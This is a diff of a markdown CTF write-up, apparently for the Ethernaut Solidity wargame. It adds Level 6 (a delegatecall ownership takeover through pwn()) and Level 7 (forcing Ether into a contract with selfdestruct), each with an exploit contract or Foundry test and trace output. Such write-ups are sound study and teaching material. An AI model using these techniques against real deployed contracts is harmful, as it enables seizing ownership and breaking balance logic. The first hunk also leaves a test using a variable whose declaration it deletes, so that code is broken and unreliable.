@@ -23,8 +23,8 @@ function authenticate(string memory passkey) public {
 ```solidity
 function test_pass_attack() public {
     vm.startPrank(attacker);
-    string memory resultpass = instance.password();
-    assertEq(resultpass, password, "password failed");
+    assertEq(resultpass, instance.password(), "password failed");
+
 }
 
 function test_attack() public {
@@ -211,5 +211,87 @@ function test_attack2() public {
 
 ---
 
-✅ Ready for **Level 6** — coming soon!
+## Level 6:Delegation
+
+### 🔍 Vulnerable Function
+
+```solidity
+fallback() external {
+    (bool result, ) = address(delegate).delegatecall(msg.data);
+    if (result) {
+        this;
+    }
+}
+```
+
+**Vulnerability**: The Delegation contract uses delegatecall to execute code from the Delegate contract within the context of its own storage. This means an attacker can call a function like pwn() on Delegation, which executes pwn() in Delegate and updates the owner of Delegation, not Delegate.
+
+### 🧪 Exploit Test
+```solidity
+function test_attack() public {
+    vm.startPrank(attacker);
+    (bool success, ) = address(delegation).call(
+        abi.encodeWithSignature("pwn()")
+    );
+    require(success, "Call failed");
+    assertEq(delegation.owner(), attacker, "Attacker is not the owner");
+    vm.stopPrank();
+}
+
+```
+---
+
+## Level 7:Force
+
+### 🔍 Vulnerable Function
+
+```solidity
+// Force contract has no receive/fallback or payable function
+contract Force {
+   
+}
+```
+
+**Vulnerability**: Ether can still be forcibly sent using selfdestruct.
+
+### 🛠️  Exploit Contract (ForceDestruct)
+```solidity
+ contract ForceDestruct {
+    function attack(address payable _contract) public payable {
+        selfdestruct(_contract);
+    }
+}
+
+```
+
+### 🧪 Exploit Test
+```solidity 
+    function test_attack() public {
+    vm.startPrank(attacker);
+    forceDestruct = new ForceDestruct();
+    forceDestruct.attack{value: 1 ether}(payable(address(force)));
+    assertEq(address(force).balance, 1 ether, "Force contract did not receive Ether");
+    vm.stopPrank();
+    }
+
+```
+### 🧪 Test Output
+``` text
+[PASS] test_attack() (gas: 131011)
+Traces:
+  [131011] level7Test::test_attack()
+    ├─ VM::startPrank(attacker)
+    ├─ new ForceDestruct
+    ├─ ForceDestruct::attack{value: 1 ether}(Force)
+    │   └─ [SelfDestruct]
+    ├─ assertEq(1 ether, 1 ether)
+    └─ VM::stopPrank()
+
+Suite result: ok. 1 passed; 0 failed; finished in 6.73ms
+```
+---
+
+
+
+✅ Ready for **Level 8** — coming soon!
 
